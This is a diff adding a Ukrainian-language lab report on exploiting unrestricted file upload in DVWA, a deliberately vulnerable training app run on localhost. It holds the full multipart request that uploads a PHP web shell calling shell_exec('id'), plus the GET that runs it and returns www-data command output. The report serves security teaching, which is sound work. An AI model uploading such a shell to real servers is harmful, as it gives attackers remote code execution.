@@ -1,0 +1,65 @@
+# V1. Необмежене завантаження .php → RCE
+
+Рівень безпеки DVWA: low
+
+Результат: ЕКСПЛУАТОВАНО (RGR-V8-1337 id: uid=33(www-data) gid=33(www-data) groups=33(www-data))
+
+
+
+### Завантаження веб-шелу
+>>> POST http://127.0.0.1:8081/vulnerabilities/upload/
+>>> Content-Type: multipart/form-data; boundary=47cc096aee591fa6ec2f0161056f2873
+>>> Cookie: security=low; PHPSESSID=9d2b38caa56726ee969cfd97f4f700ba
+>>>
+--47cc096aee591fa6ec2f0161056f2873
+Content-Disposition: form-data; name="Upload"
+
+Upload
+--47cc096aee591fa6ec2f0161056f2873
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+--47cc096aee591fa6ec2f0161056f2873
+Content-Disposition: form-data; name="uploaded"; filename="rgr_v1_7c17aa08.php"
+Content-Type: application/x-php
+
+<?php echo "RGR-V8-" . (7*191) . " id: " . trim((string) shell_exec("id")); ?>
+--47cc096aee591fa6ec2f0161056f2873--
+
+<<< HTTP 200 OK
+<<< Content-Type: text/html;charset=utf-8
+<<< Content-Length: 1502
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+jection (Blind)
+Weak Session IDs
+XSS (DOM)
+XSS (Reflected)
+XSS (Stored)
+CSP Bypass
+JavaScript Attacks
+Authorisation Bypass
+Open HTTP Redirect
+Cryptography
+API
+DVWA Security
+PHP Info
+About
+Logout
+	Vulnerability: File Upload
+			Choose an image to upload:
+		../../hackable/uploads/rgr_v1_7c17aa08.php succesfully uploaded!
+	More Information
+		https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+		https://www.acunetix.com/websitesecurity/upload-forms-threat/
+				  Username: adminSecurity Level: lowLocale: enSQLi DB: mysql
+				Damn Vulnerable Web Application (DVWA)
+
+
+### Звернення до завантаженого файлу
+>>> GET http://127.0.0.1:8081/hackable/uploads/rgr_v1_7c17aa08.php
+>>> Cookie: security=low; PHPSESSID=9d2b38caa56726ee969cfd97f4f700ba
+<<< HTTP 200 OK
+<<< Content-Type: text/html; charset=UTF-8
+<<< Content-Length: 63
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+RGR-V8-1337 id: uid=33(www-data) gid=33(www-data) groups=33(www-data)
